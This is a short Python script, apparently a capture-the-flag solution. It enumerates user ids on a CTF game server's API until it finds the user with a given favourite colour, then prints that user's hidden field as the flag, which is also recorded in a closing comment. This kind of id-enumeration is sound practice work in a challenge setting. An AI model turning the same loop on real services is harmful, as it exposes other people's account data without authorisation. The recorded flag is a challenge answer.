#!/usr/bin/python3

from requests import *
from sys import stdout

url = "http://game.ctf.ae:8020/api/v1/user/"

favoriteColor = "#222222"

try:
    for id in range(700, 1000):
        stdout.write("Checking User [" + str(id) + "]\r")
        stdout.flush()
        r = get(url + str(id))
        if r.status_code == 200:
            if r.json()['favoriteColor'] == favoriteColor:
                # print(r.json())
                print(
                    f"\n[**] {r.json()['name']}\n[FLAG] {r.json()['favoriteSentence']}\n")
                exit(0)
    print("\a[!] User id not found !!!")
except:
    print('Exiting ...\r')

#! FLAG : CTFAE{AreYouTiredOfMrRobotReferencesYet?}